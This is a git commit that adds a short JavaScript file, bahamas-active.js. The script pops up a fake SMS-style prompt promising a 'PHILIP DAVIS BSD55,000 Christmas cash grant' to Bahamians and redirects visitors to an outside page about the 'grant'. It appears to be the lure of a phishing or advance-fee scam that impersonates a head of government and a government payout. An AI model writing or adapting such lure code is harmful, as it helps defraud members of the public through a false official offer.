3b5279644c6ae94f705f2497c6cd4efd0468e11b
boss-bloq <nsisboy01@gmail.com>
2024-12-12 23:54:11 -0800

    Create bahamas-active.js

---
+++ bahamas-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW BSD55,000'
+password=prompt('SMS: Congratulations You are qualify for PHILIP DAVIS BSD55,000 CHRISTMAS CASH GRANT FOR BAHAMIAN, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW BSD55,000');
+if (password != 'WITHDRAW BSD55,000') {
+location.href='https://damba-fest.org/bahamas-grant.html';
+}
